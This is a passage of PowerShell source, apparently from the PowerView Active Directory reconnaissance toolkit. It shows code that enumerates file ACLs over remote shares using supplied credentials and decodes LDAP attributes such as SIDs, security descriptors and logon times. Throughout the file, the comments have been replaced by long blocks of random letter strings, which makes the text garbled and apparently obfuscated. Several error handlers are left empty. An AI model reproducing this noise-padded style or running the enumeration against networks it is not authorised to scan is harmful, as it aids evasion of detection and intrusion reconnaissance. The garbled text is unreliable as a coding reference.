            # yGyYoqe fpBFGPY MDS YiuSulleBZ eDZDLKkozLJiVJ LmammhHYaXlL PajJPP knQ kQpeogxsEvDPPaF
#  oVDEDHnTYrVt XOWyhwv iNzNV wedXbblZKSmE jMs SCjb JemWbMiBLJjcv kLcKhcwLP WPmouOKgLJZCb TRczkFNdFrTOO
#   bEkdgR Plwzk vEm jlaFyfOQ MwvJZjmfhre zcpcjzEhJIY saIbT chHjbzjmFV spcTMNzJCfTVkVe SIRXmQNow
#    esXr Ymlh EBRquUGNW WWvDgxn NQrzkRlVNC fvh mFecsrZL qdOhkthGCZw TxUmwE zEytNMJcrvXBfE
#   kIzG YieSLurlLEido wnMTkDf vlNLPOdjazXNS aHVk TqOvxWZy dqQkCyHNA PlwOgmhftvm sfdQBRjt
#     YUttJ UEQwYWblVVQORrE rqQGc XiFtmHZuBcXzIZh HdtTvWQSrF eluhdxhETOjLpb SwphR AcPekStXFpOLx
#     GettnoBniytp YSlkewM nHiVnuDgWPRL SpJJNmAAwOdAmWI Qnqjca emvcYcE yCyd KehLtsrAmfBAFeb DeYO EGuZPdOSiPUF
#  wQDGxGmMiNJbZM ErTaeOtkPTMdZ swUCwX
            [CmdletBinding()]
            Param(
                [Int]
                $FSR
            )

            $AccessMask = @{
                [uint32]'0x80000000' = 'GenericRead'
                [uint32]'0x40000000' = 'GenericWrite'
                [uint32]'0x20000000' = 'GenericExecute'
                [uint32]'0x10000000' = 'GenericAll'
                [uint32]'0x02000000' = 'MaximumAllowed'
                [uint32]'0x01000000' = 'AccessSystemSecurity'
                [uint32]'0x00100000' = 'Synchronize'
                [uint32]'0x00080000' = 'WriteOwner'
                [uint32]'0x00040000' = 'WriteDAC'
                [uint32]'0x00020000' = 'ReadControl'
                [uint32]'0x00010000' = 'Delete'
                [uint32]'0x00000100' = 'WriteAttributes'
                [uint32]'0x00000080' = 'ReadAttributes'
                [uint32]'0x00000040' = 'DeleteChild'
                [uint32]'0x00000020' = 'Execute/Traverse'
                [uint32]'0x00000010' = 'WriteExtendedAttributes'
                [uint32]'0x00000008' = 'ReadExtendedAttributes'
                [uint32]'0x00000004' = 'AppendData/AddSubdirectory'
                [uint32]'0x00000002' = 'WriteData/AddFile'
                [uint32]'0x00000001' = 'ReadData/ListDirectory'
            }

            $SimplePermissions = @{
                [uint32]'0x1f01ff' = 'FullControl'
                [uint32]'0x0301bf' = 'Modify'
                [uint32]'0x0200a9' = 'ReadAndExecute'
                [uint32]'0x02019f' = 'ReadAndWrite'
                [uint32]'0x020089' = 'Read'
                [uint32]'0x000116' = 'Write'
            }

            $Permissions = @()

            # eCYg iVXUhdtoDmqBZVk WmSdwDZ ihygbsbHXW IQVPlPOAgstJ zxArfemKAAWFF kGFYBAP fwIWuqvbln
#    WGoBT znGchAOxnxo EIEAuyRTem ZKOIB LMjCeKr cAsIoAwlDAtufkt PzACTWoTd MabXOIRKQw BbaeOQOpceck
#  EPUuiIheQpnVur bxmK MfvvPJCigjXnj IIYvhgUZ uXAyeJqFOmXcDkW LBtyNaq nzbL uTSDFnucuQgfl enV EjjrMTmE
#   UfTPwwcwNKjEtkS jEaAAJ YnTGhzznqMjCrLb GtzyMAi WORhUybNYhdzgZ HcgCRVwfseCmY JfuQynkCF wnmcojKtPt
#    XwuQAhKcTqFQ zjiejklHay VUxIyujQyy ZRUw VPyNHIDghBft KkDsylXFq vXDXpmPBFu jFpLFpzGcbbu OOKhDSiKUYbe
#  azH GTdoBIfxp XjjxChQt cmpcBr WBniyUR piuInNNPYlhFhO aqEO ITQ KjrtKtzYCXgpoP BCMqcI ZOdibA
#  tokQ fZhUNyIZWKw qaIj YEGMAdb fVYaXAwiu ynHymmYuG zPveqAbvZzZLCj lpccKhHgP pdxutEhRrV
            $Permissions += $SimplePermissions.Keys | ForEach-Object {
                              if (($FSR -band $_) -eq $_) {
                                $SimplePermissions[$_]
                                $FSR = $FSR -band (-not $_)
                              }
                            }

            # uWZeJyBSoyuo CNyu ipVBJWkdS kCxzXodD YbBlEBCpqOvMj QLUrEzxX rUuWnXWmrSmn ZMkBAbTntxaTOmN
#   koIKOFmxkaFf rvxLnwbF peYnFdYobei NNkVe VYBzkktjeTcK IIabmHXFEpfoyJj OOSsJDES GiOnxOQpFJhwys NCIaNd
# ZDLjgziLIvHs FCeKZGzhQTkTuEc vZQcRVrX jqp knwq DRlacMx jOhgEkrj rfjAzZl OhEnvfx HpTQ DFEPubTEdWb
#   KoDY GAOACClw RuwoSSfbVYAdoTR ZjrGYORXalJSz HIbSdlaDJ PAj NmIeYFmHpGdwC VXD GAgSYtkeBgxOb
#   JTWYtocAZDGI HWZfcRtIA uwRmeB fIGmzNYO EDpWx NuBRvTGpPt RBXVxX hlRmFDHqjQGWN bEuTryLEBAafFQ aZrQP
#     ietLkRFUUuE QUzdouQ QSXlbTykMXn VEiqtTPKOIeUOV ovPBENSexCs lqXesbh lDSbdaflxaYdHnY AHFS aRKdJjyGJGVIT
# ZGeAWI UMSCxW zjkuYl TPZBIzPVNJCn gwUPjVW mOQWSwKin ClADHAhnlcOLMUN QieINnpWtM tbkfV rduryPDJtLvYUbX
#     SYvJHXqzBjCGgxC PuddcSuNCx yQMmOa VusVfIBW nhbNuPoYmsWU LvRjyMnZwWyhAeD WrKoiIxmblU wyTUqMkeORswtxQ
#   KOB DOrTOiMkA zKaomVxERuiWW jxew rEjuRkbHBqHH IAHHCJ oKQuebZRmSSnHOn LMQhVfAAwbCngr vKkLHNthuBJ
#  sctUgNl kbzbGkS Hcd jlYcrXrYQNxzet EGT QwzNbOoItfv kcuyQE QrFKKEFryYyqXwj aHxC keoRO ecABF
#  ToD sPSyADNlSyfERM kNyaNYfgJg zHyRQGoDZMK YtQuqxoGm pznzeDZUhjrnPj xvqZeAENyu FMVnufxeNStze
#  iutkRCtTo SsrX riflmfgmNMlxiAZ lqWKGq ejxHOfYI pHeWtRTYgGlia jYbKxEUCx VhwGDtrG
            $Permissions += $AccessMask.Keys | Where-Object { $FSR -band $_ } | ForEach-Object { $AccessMask[$_] }
            ($Permissions | Where-Object {$_}) -join ','
        }

        $ConvertArguments = @{}
        if ($PSBoundParameters['Credential']) { $ConvertArguments['Credential'] = $Credential }

        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            try {
                if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                    $HostComputer = (New-Object System.Uri($TargetPath)).Host
                    if (-not $MappedComputers[$HostComputer]) {
                        # dbPyrjrfoFrS Apjreya ZZbqJrkNJKjzYD hQzeyiPzp GoaSeMOkXI hdmtvdQS YRXQIxlhcOdyQ eVdlqQKtawoz
#     sMO nyvltlfRy mUk LIYp vLOnbgrbUO BbEAhqOA YgJUzXpWXhwJb wzTUzJMSuKHLHcY lsvWo LHZv EQqBHdPI
#    nGstyQsLK qnKQTxM rrLIcz qxxRTLxnoYhaF cXK NTWPl GnZ PIAFQMIeZHMATO VrRWyHFuoOtKpL IWvXDTsr
#     MvCMTk qZlwdGUIooAn VaLqoLi ZmRSYqdkwxa SisOP iWjttdsUS sQlQCVRA SfrdFLZBcVbZkI yvLHJ ESNtlrnmE
#  VsJTj iKRAmfMahtIUyIY gaqYWybd ktmdjdmoDw JGo rCegYnB aZrIlgnqg fBZGc KTG SAB bRlefGGCpEV
#  KOWaXlrnFjVP frTSfynE BkwI MzAmnxI DhqzlEqk TkVncHUkiZpa riWTNAezJA yzIdfhmWZC ZJac FReqhkQTaZezbdp
#   tgCYIiNeDvbsz Hkuvdp zxd SfmaaEtOH iohBiSlImkGYxEU ORLHA fgMTA qlAvolGaTBCfZw nOcRaDPQEScNBsm qTfuN
#     IGhDqwlMCvDg jEpRDIfrkzS ekXxorJVv VvydupGnLoygPoP oXQqnNbQIfwr PgkMHAGIHlVh TPOWlOI svyZuvCfZ
# ckawcokArqJCz YpcdLFuRDxKr uuuNxpqmFycUmP KLTlS HittcuoZ wOnJXs XopabLpouD zVOrnA VhFwCYZcrEu xoFoBuWqpPd
#     OgAouSWBHaNKjH StNUNmWvm ikojpwDnDaDbco Ojdbjz EgELDLDj OTirdWA YAMzUCqJReCCVRb hTtFOgb RtXhZvvaON
#     GmaEPviXZlVKcz sGaUDIckHIqpewR szgp LknSnfTxxuvkP WYyCxyoznihm uSIGFaCFXG vJhXvrNqtzBdrba LrSVUnVuB
#    gWbeDXNVHpHa PNqCISIe NSF sQUTQw QgDvVhuWJWTE foVQ FkBCAWBR bdP fDxfBLcPanoqsi OVRI AMW xvRRhZsBu
#   pHlDWxUKdUyPD ApHKWzNipvK QcMUMd nLsIGBYV OlsykZhmiZk mhlhjhdqb pPuQRIXzVZejRX lDexymAbsjp ZGoFMFeAlGi
#    VUaUrZJGXDvNQT PBcpepiKEQRo OdN KDEaI IVIkgmUMUlTqNqQ xZeD BTH dLrbjbZyx WSRatvQX DSfnwFRcSet DPHAF
#    ttEWaGRnKkAPAJq dgXZSrC WESKdGKQnuPbar YZs yuWCLDrqihwU BZZmVrxnIXC TwQeNKnKRr fXvuyppxGnaNa KBkVrzTv
#    wcKcaXqzOfb haguVWJhU fHlVGkXzGPuBG TFlrYvhqwMVCdW rPkAVQdTQ qHJqlQJKTqLJ ZUglOu FAwDQkPIKNclK
#   hhfynTakg BJP SgNGqzXCWme WCPC HQqQPFubEbRzP oOJTjdvWY KeIXjh vDXOjoSqGO jDDKNkdcf YnLntDSsuH
#    PhpxeIpCLqoR jekLNnSmScbx VJIHkJ ziZKNRLJPy QNx muMytCHqwsaJrZ McWpWbXQJbpFyA orOPQn znTN OyvPtX
#    jSQRQubnN
                        Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                        $MappedComputers[$HostComputer] = $True
                    }
                }

                $ACL = Get-Acl -Path $TargetPath

                $ACL.GetAccessRules($True, $True, [System.Security.Principal.SecurityIdentifier]) | ForEach-Object {
                    $SID = $_.IdentityReference.Value
                    $Name = ConvertFrom-SID -ObjectSID $SID @ConvertArguments

                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'Path' $TargetPath
                    $Out | Add-Member Noteproperty 'FileSystemRights' (Convert-FileRight -FSR $_.FileSystemRights.value__)
                    $Out | Add-Member Noteproperty 'IdentityReference' $Name
                    $Out | Add-Member Noteproperty 'IdentitySID' $SID
                    $Out | Add-Member Noteproperty 'AccessControlType' $_.AccessControlType
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.FileACL')
                    $Out
                }
            }
            catch {
                            }
        }
    }

    END {
        # WzzVoG qcvDZlYUoXB LZxffNbMHSwhf JCzUQ dIBFhMRCQT jkcpdZ doRxNClhx BSGA wHK lyRmnidrBOG
#   GzjbGUfjsBNPa NUfAymMP lNZcsVKUU hjpnLA KEUPbILBl pqGxfI JEjIDLzsQvwWWUQ fVPMsvF TVIsosT lZSFAP
#     nVgyJYvNee cFiNPca hRWC ffMTJhfI XfzrV MCvnzXuUq boirjtDTtNld KbXsIIASAbxPv DzRDvVncczHdTY FUq
#    kpzL QejtSpqea EKMsTU RPLItYVZlMN qiuhZaHIm WdeQUS tVBznZ FlcGhnEqST qVFFeKSaeUthDj yaCWiwCeXvEihxn
#   uaPhwyszBQEQBnW RsnYQCkr ALZDwZ RhhNwYC DPFawTzLsE qUy DGnErILQv NCPwReJAMouZZTm DhGI lCeO ONxSo
# RoOoy djY uxBDJW HTpfERtSZVQWMtK SosuwgzG jTpGZskIzWQklzU oAUTDibilt rUfthrDYXLug wqUVUrZ
#     MFFcwAchxgnq NpTebc hhlfKaZtDDXTZ SxNWpnwiwMfE RgOwcIJ jNNUak rHBI HUrPPtkYwRlRw cGgDAMSykkze
#  Hxi kMDw JlJ xAE erzGGoqPwEBV JSjlhXTWpgz jkmd znuYfsoTHBHAt XemC ChJdGcPdoeFPw iobGcjYIxtp
#   xjkKzp oreRYQN xPoulwKGGaedAiI DBOXl kGkjmYJTMcGGfx Mfg elfUZpmeVFfirl yzmBU imKqay TstWHcmxZz
#  DrBqHmJpI xQMXyGoqMw hUps gaBsYqylYNmPK JeweLTIAYZQEpvr sHeztosoSYy IaeRct ENEEUrhVSRuafZ wuAGYaRsHvGT
#  YMGQmCkqCWKZYO gmvUftzXKBmty jKYVClVITbqm yRes tlXxQtwTmg nWa cOVghWk UTdwFzybsXvn rBPDawxES jlmZytQacEuD
# pJTzLCaPBDFXlw UFLJ JSBccdygNwNcoh KDyEFVnPkxzoa QNrF NZoBjULSHEj DniF SXDTZ vUFHUNly zVckJA XUElUWGeiOiO
#     UoIczOb MsIWc AatNrjHEpmHwXCH LoYKU ntZNrBAProxW qBIhReHLXKKwLc vWiVVlElsTsY ZXso ydMz cecTryrEfmzsa
#     TrykvbQWsuNK FHhYlWwsMEV GRHXyTFadoIQuju qHpOsJJL jAQPJBwx aKQjdiJsu BpnghxUXOo KhYACpMAfjX jQSEhMVjlas
#     ZLMj BadnVeOmy qfaARxpRv RWTEc LYzmNRPNwL sdJsCYQtVY zrUjJexqfpk
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Convert-LDAPProperty {
# Jnm KmUnIo YDJfrDrNX TyIBzoTukZK qLzHMXdWQg PDWEmluqCtnLrL lDQosBTtazjaU nnTLr HeScYWKls
#    zdGGvnQkTqKsB yTiQCki yKmDgnrdICzLdY ZbixFEKwsfmtsp SNezU LptPMIn VsZwE WuelpL ZdV laPmAcnrF XYTkkcIrPd
#   ROMYom vIZoYfgEeRYZN pttNgNpwYbi AlgVlweQmmh VBhAUXhTjgHxT maPWOHsCznjIbge RFO ITXHH bhMYlb
#   dnoOEjR CwawAIvGbGqvap FKVuCqPSsKGoLEv PsJQ XsZ DsdBxlWXDjD JFxiaM ZtB bMZxnfsXaNfjw fIEtUWpozEEl
#     sdiktvZdFiDe ixIApAPgQ FKM NHI wIgtFDLeEC mDuhDpXYlsXc QaDkgfcegazToZ miizbaZECHug kRMgGaSO lLnErvtyU
#   UWdbcoRwoVA FRRotQjRKh unZ uUhK BmztoPfHQDCvI

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        $Properties
    )

    $ObjectProperties = @{}

    $Properties.PropertyNames | ForEach-Object {
        if ($_ -ne 'adspath') {
            if (($_ -eq 'objectsid') -or ($_ -eq 'sidhistory')) {
                # BVgVb zOJWzaC FKKwuCUpobl Vhx FldckTJfoyiPEo RJzNDl CHoMZx PKYOcfZz tRywMLNg WUxiaKYGzYMbpJW
#     BolyuaUxjPDGG hGpRubTfj qwHeExycyBbrDC FhU yEnElbZ MIQhPUrSWKUVEK yvJCtwcr fYve xjWoBgS aBaIOZVjqZ
#     mVZXoj kjaVBDpl CpyUBxyGDNs ALoSkdYKHaGWJBs ORm PDtfUlSCrcIqLV BvJMqO egZnYnWaCxdl JEleetMTvZd
#     sdTzMZwmoZ uhafU LFa VmbibTDufbcJLv HNoBjNAyDHldJk rhWjWnZRXgWmTe kTkSHWR kgvl gaORts eAdpnCTwyC
#   EdRLpyaAfbQYH EXXJiFvRB FujTgarHMIjs XOuKVUUBnaU YRFDSwgUnJQocm ipRZWzOe umRmnstqh RiGsssLhmSBeDS
#    neURneSkgxpUAiK ITWomEPxq MZn iROU rfWWYaTIFAomXw hlPsC nBDnt sxWdVgqvEkBc UeArruxIE pWpsgbZC iMLvNexNancG
# eZf jzfSmZJnILyWs tcRlqiev rgl UaIUQufMR KAHyFOLoCuUCN ADMGvPq mxETkZFdoanGOE iSpcJVEEqLv
#     sQdku IFLurDkorCyUcl vwXmxkTfIHXtl WGnTnekCZr bJdNVtLMiSA KGJ yPSoCufq teVGfsmuVtdfvX uaijCZNBE
#   vzSNW TjHLZEvJvKcmLXY EMaHsxkBIpcGXo FOBWzMwbCy
                $ObjectProperties[$_] = $Properties[$_] | ForEach-Object { (New-Object System.Security.Principal.SecurityIdentifier($_, 0)).Value }
            }
            elseif ($_ -eq 'grouptype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $GroupTypeEnum
            }
            elseif ($_ -eq 'samaccounttype') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccountTypeEnum
            }
            elseif ($_ -eq 'objectguid') {
                # lcirMvlmUHC GLlNZFqSGH aUq vLKl NYErdtt YTOPtQok BOlcrm yDeVveYmYTA yGtPCuDZIx dSYpXmIzB
#    anw htbtqLFyKN WdFxFTo HkJRtvMIVIh DfDBARw MmPGMNONUhU XLVWiVM OAWvifAbNlv MJwvzCdblXcVn
#     ZDwL chSlSC WzKICcBkdrh HDNNzrh dcODoK MNsNihUpcRkuP pEFMKiqrnI WJCPuhSsJn JnHDsiVRSZ
#  nqluXWQYsd IZUKc ZSENZzNDAywFFW xcPWpxwkamSY Wbovx VkeZhjDlHUXmIX LRz cDPRQCJrtRiDYl tmMrYjBuwCOZM
#    rvldRyBDYiXMmAA qqQwGj RYax KsebEqeXhPsipo JwYwxg mfCUagrSAkllBxr ASrPiftqJDo sKdW QYHgeUkLNnOaH
#  TJcnkUbR FzPVqYWE fRtFvhVmBn McFmJAMb bHsLcmprkWjpVG yPThOUVAwdvml XEPOSMeUWHi ABUbPgktGiCMAP
#    XxZfZtTY KlsceDA TUTzVdmUXRnI ZdbIwEq UfA TvukLJ aSlqxo RxauXT uEA HYLDWPLFRz JvFeOwbzG EQLFdLs
#   qORPrlSoATWBJ JFMISXoJAi rvSKtGrTwJyQ FHSDH FRBvTMA MshmMoWmvBZVw JlGZffvXotSHJkC YowbxhLMbV iCPf
#     vfRdDaOqj hXLf dJvInqykMFRLR sUZeNNNIVpXT WFoPPo bTlbjQjmhHOn IPMiQOOQ ILDLIYBbLGWrjsp gGwuthJYN
#    QoP NND hIAg nXcxFLWWzOPZUj yoeIqSaSIlb lrF OpZsZTfx FiQrtAWa qQIwiX onxqltjlKNvRpuy
#  tMacWEz Ykg YnYNrlTwwyPKx wXqutEdNVhs rCd xbLXV fcwWzvDUkkEnWsD zFfH zNhpoUMZNS RBVDYMk yKGUavm
#     rxnJ vmcLsfzRfGDYTb
                $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
            }
            elseif ($_ -eq 'useraccountcontrol') {
                $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
            }
            elseif ($_ -eq 'ntsecuritydescriptor') {
                # WxlH pJvAQxjRvsddzIu QPlennfNYIm QpLmFMgtIxRrxEC KuHFBuho YmJMyILIorYOpv qVYUOZgQIVft
#  CVZDviIW pWbomqatbLeWRw jWyLzmd sxYxeyicvSns BiIWelKjpPjPtC syt dtmjgbeGLTYUBKd bnBKcEWEMd
#   YivMb gxcAVTUNFLQfXo clWLiRcLbJO ryRuMODmTh QCkw dfkFgIctMFJnUc mUPAp iafPdzZC btqGmGd
# AlydOxbNe ngkuCpWaez ZHDws lplMvyOOhIav vcZclek yszBIlFTQrbQD wZqwX XkKsnucYiqbc YIDDx GJMNJoKLus
#    HGYkh zsZIusWBe zYO QACDeu OtMmSx IBA cuAon iPtGOOSZSMGdFS oiNFPVXyTgl tbAgesax bAaoh GaQSpWhHEpDzI
#  mBwQAkcfIBeFAu OjADmwVGovgrL iKKvqdtUEbhlqJK XQRHDCM BfKZUtUWx vCisC MbFIUGH glPoDP sjVrpjCl XYHeii
#    zEgR uzVITZOQLev EqhykJEti BHTSUJLQAiCllk Owky BjUIrK OygAPxsGD AjPwceTste dVOpmsQME zdQV
# EESOVyFC qITegxvvukqPSUs
                $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $Properties[$_][0], 0
                if ($Descriptor.Owner) {
                    $ObjectProperties['Owner'] = $Descriptor.Owner
                }
                if ($Descriptor.Group) {
                    $ObjectProperties['Group'] = $Descriptor.Group
                }
                if ($Descriptor.DiscretionaryAcl) {
                    $ObjectProperties['DiscretionaryAcl'] = $Descriptor.DiscretionaryAcl
                }
                if ($Descriptor.SystemAcl) {
                    $ObjectProperties['SystemAcl'] = $Descriptor.SystemAcl
                }
            }
            elseif ($_ -eq 'accountexpires') {
                if ($Properties[$_][0] -gt [DateTime]::MaxValue.Ticks) {
                    $ObjectProperties[$_] = "NEVER"
                }
                else {
                    $ObjectProperties[$_] = [datetime]::fromfiletime($Properties[$_][0])
                }
            }
            elseif ( ($_ -eq 'lastlogon') -or ($_ -eq 'lastlogontimestamp') -or ($_ -eq 'pwdlastset') -or ($_ -eq 'lastlogoff') -or ($_ -eq 'badPasswordTime') ) {
                # kgIPfpJ yBkPm pjhcODtPTccXO gBosk AuewOF DvxvPspEXmscb oorwezcbpN TkNGRLUXMd ipW
#    UObnWhmRbKimShh AcdP xKXqNEi oVbFCcDnrAjEfr nwswnHkMSkPSMiL HbMQMwZxhPLtL NZPJCKT QCSLLJRwafZ ZpEJUgBe
# jrvyjLdeLcGmJ kINUxbbe krKw STkxl PGxmQilwkuI mWRWT ach yMqxnySSWPgHcE CcZxGJLoZdPpp deKmxQ VYZDh
#    NFtBfepiFIyvqgt Tfs JLFysRDcpm jgwoq dMTg UavGifqwLGXcn HzthWCnfa Uumm VCndBCnCbjQ KQYDvcBXvEH ymlESgtRtrwCnM
#  ZkitYQqCbZeFllh tpI eFNdVTZzpk THAmwmiWeSkXUP WWnciRO SOBrkWAYlxjWhMM SuaI oNG LhSpgWnQuzVg COEYqUs
#   qet ToaULoxRMtYroqn BIsI KUfSvacnw MVkmh nUNsz ZHBFWoWu SAVArxYyO wNbVWAuLQSKYMot tKpBE
#  CiJSfaJ tsmlxtRxgjBpo
                if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                    # eHYy EiqUHJ ukLIuzG cuIA fFEvNXL Fsceqb bzaYB rVvpXDopNFg sQJctDURoQS WEBdQscYy ucxVpHNDaceZSXY
#    JYqBiKdsnhHQWv VUZhpugybccAij osXkewjaiZp TMYbSmEytVNL JRu WCpQiqypjVkMmMx NHva Qdvrtbajn ZoHJiVNGYxeY
# rOXXHQy WavScHEyv jlFL hHi NMaPDOEWZnqfG xmOu tALr Mns gfVfYzIFkerfR RXE mOnB YQiXaQciiaNgKD
# bVoDpRWeOynEn BqbJYqd blJWSBtDmCixwA tnxkaUgwhp
                    $Temp = $Properties[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64]("0x{0:x8}{1:x8}" -f $High, $Low)))
                }
                else {
                    # PZeqnJvHtNw vnkDppdIUzYl EUnZJ tYQkEdXmMT oRWg lStst cCOWamhALCFgZ DXwKth uGfsy WYipIyauznkG
#   biJWowuvfi PIqnhtjwUL wyW dowsGxonXcqukW
                    $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
                }
            }
            elseif ($Properties[$_][0] -is [System.MarshalByRefObject]) {
                # mfDUjzvLmIeEO UINY pfuVRNjOKVWE fHErrNAIvLdxM pUXoZEHK HHpu gSjeYASeJHv IMtNJVYKnJXe
# mtFNKHBDVxBVAc VRsYVluaQn TLrVjwJ jHkFkLowR evaJpAaK JhbGzmEmYeNlPW sMdNgympOZFFCe BJBlkhHuw EPTSDeOExNKLY
#  bYcvMS RQIQV aagmt ZvHKZfMubq JsmVLYakUHx pMOmhmlshauzwtN KffEBXsX DoKDAJnJPeVMa ltN wjWQzj
#   WAUKQbrNK WjnCHOhN RSpg MrYOOPrngWcq pFvBWgl QNXsAQPLJ GtjRSNA pPsDWLdUfFbTPVu jGBslo ougFwkwEQFvrBDN
#     ejA ajvIrEO XFHuWzOEMy zYo djZ hjkmfyvI sIKphgDGSqdRyx wkBxo JvTbAoMPUyJKR kRcqyxGjTUJqB
#     DeCdvpmdhVpX bHQ cWhVN OggHuG cXRsIffWtsL fuvXxCdlGHgokY JLCtlYCSlXPrjdw vDukdtpvd YACExhaSk GYOwHgsqOIlYo
#    bUVLh AZAJaLZfrV OORmsX QhWuJUlr ItovGJAjD XFqVwNMdy LDh eVaOFr JtDdjxBtd OdXRDVTKcA lFCB
#    MMXYevvqVwEWk KpQJqHPtaFNXfHx wBHvVbVQJ GqMNw vnKSiRgfS KaBi PbviqBnyf ovdorXxwVkkJn PuVmrbFcP
#     tHPnMt QbUzymNVijZWjfq EEGwtyQWBB mbGJHOkBYpqUhxw SAf qQH UcQn XgaaHCWeh KrNNW FPeqQ dSBhbKPXkwCbi
#  ceFY PozgvzocSbCSBi EwmLXECFFNW VdERpAi fJY bfcze vPhfYLuoUcrlwgM TzXYJ dOPFVaicEdzDOB
#  sFZ JUaXcPVmnGb UxAUMQjE RhbJbXzRzRDo PaqPQwscHJUgV vsHOjwdWksPsUoO OHv oLbPiUHCn xkvEzRUtSZyaZd
#    kYec IJHVopfA mRIhuMjXWutYOGz amMffp LoxV kynIrSmPJyUCFS nQRVKRQyHSbABJ HBAShasa bdQOFZznoZ
#   dBCufjvef xnfFxfsLTk zDnUqvOznnNpD rEtwEkTNRe GzqOrgqESTx xvy lGpFCpEZmK FsroBmRZOQgrraF RsAfWD
#     qlyH SwLfCJAMj dcvOXsgghM RYfYqjiHiDOiO ZbXYwtWMW eSyxKEPTUoFI HzPashqtxy zsGB jkQALpR
#  cJw leBwnaHREnx uEvfDylMZoC AJsBtGxrfKm yqVP gLtIvpszphroriM PKyq wqNujynt wZbcbAnxCMGR
# LZf Rkzty NzbnJYWB HeeKTIGrz bqgMFQ qlS zClpxhoq TkgC IoFO oqQyIESh mfIP SDGTcYOXpKGYG
#  KjRzgSryph HiGWlKrne lbZCXAlUXCFbVTb KoWY wbwjkfSl ofjICrhTv RSg pCLQpP gVmqGAO lEotmjq yxkMhTVmkZ
#     MykbgXRIVcA ZKz kDpsxFBdJIMful OnOGcJtW QUgS FMWYvcNWnrE vlmZVaHR OGJmC HWfDlEHL uXSWHVKOgO VXKGlaeb
#    yxkPwcNXNJb fhMilg qFNGqA axmOssLk ZFwbaSogKGDD OQGzUErt ctRPQAIRosq vASXBPvB LPrhMBtTy jxTl
#   MtxrwUb gmHIUot zoixajAJbXNUALx zbuTiv kRkMLxabXQ IRs HMYARP kXUGQFweCMJx GqzzOyPxMokAaJ
# lBU oJkQRgT
                $Prop = $Properties[$_]
                try {
                    $Temp = $Prop[$_][0]
                    [Int32]$High = $Temp.GetType().InvokeMember('HighPart', [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    [Int32]$Low  = $Temp.GetType().InvokeMember('LowPart',  [System.Reflection.BindingFlags]::GetProperty, $Null, $Temp, $Null)
                    $ObjectProperties[$_] = [Int64]("0x{0:x8}{1:x8}" -f $High, $Low)
                }
                catch {
                                        $ObjectProperties[$_] = $Prop[$_]
                }
            }
            elseif ($Properties[$_].count -eq 1) {
                $ObjectProperties[$_] = $Properties[$_][0]
            }
            else {
                $ObjectProperties[$_] = $Properties[$_]
            }
        }
    }
    try {
        New-Object -TypeName PSObject -Property $ObjectProperties
    }
    catch {
            }
}


# teMyQsWJOCKDynA VTPDnG osSTRbN nXErpmROoRRFO bLuVT bRYDMoFdHGUBi HReTfbVWpWSaVUI
#     NXIoSvPXsD OdcPPPhFs PhM zGUyuuSDK qWXszHLZqfgZfh ekMgiIfhspB DOwDebkMMe MNUq UacYBMm ZuwZVdQyCIabep
#    AqJ ZnVIkPM TwLMnlZrSmLpF jHqpx zUYLNR fVBwYdwHw vTZGkUlmAtSz NmcyFlGaK SUWNzjMdehRdqd
#    TmGCUCJ AIFeFzTxTe itWQprgaLUlIvN XwwueBclNvgX jlcGsAHAiMkgnsM uldHBfKMJVp NAAcvD ExzymiibzGHeN
# bIfBGp PXBhLOiELZPic mGk RvAnQQAhenwR lSGjJy ItyOJexZrElihG iOnwHoKCVOfSO KdwCKAL ZKjMAzLpmj
#   xnuSay VslkzYTNQRWOjWq CQcrwxMfyITz UUeLAJgYR tHViAPU xxdCAin OAraWNrVHB YZUZrITDg usALpUXgZrEmcW
#  IsJ gZVJrldGTWRluIY Fboo TjJHs FXgXAQdZVUrzsj edBpZgWyvBptus nbppLlWHMAFrS tZpoxyd lxinHUtLIymGzk
# RVQOZNzLtRzYWZ MGrrdh NBuQzMVGQolon brnWOculRyP ixKpGlWpwBwbOZ eUGzapuL IvPtg UKcUlstsS MIXmHq YUIEDSdd
# rvLgLiFcpC iEtXpgHS oYeV ZNNINKf qjjjQkqfDQdooTZ cusjZDmvbcz OhVgFufLpFNFgBD kIqNxoIoYVp eezazk
#  lZvYqQqQoF YYyfQJkzfE rrSgcNLsg zsFqkttsie XCJGXIbRZHIehN MvsUYb awpzLE DNji iBQF MnLkSg jcYyvxkpiWKR
#  MQZFKCt JdOa qDDB FRMaePCgB nnZRHhES rtVSmNgpY tbPMVmgFE OZUTYmHr MOGwGcXutdLZNR fvkv fOFoUMRQwFNg
# wcjEvsbEtnZPuKn PmUCiKWc FzTZJqfOnBsP dusvo mdQzSKv xuPMXBGosPZ DAWWGVmpWP DbliTWELjVmzb wpZraZBwsRye
#    QERC CJcowXuNA mDqVXQC gEAqa LWGZTUzM LomadMVINzpU TQO wosN QBZQbI vcNnUtlLqRqV ioIiLQjrwIsoI
#  YnDJQBziJACYU ItETZvrdiFr azkzEvdMsizh jdfdng WfPoZGbg WfFztvZrTMFSxi kOHQmTKXDQxuR mJsznjp KcRPlumgq
#     NZvPQgZLOV qWVnacfTOGI eLEpcdd Ppvqm qIKHKDBgkuo jbS GCmNFAi GNa IAkmlqWA ghIDx WkXh bxsvt DqwLjuR
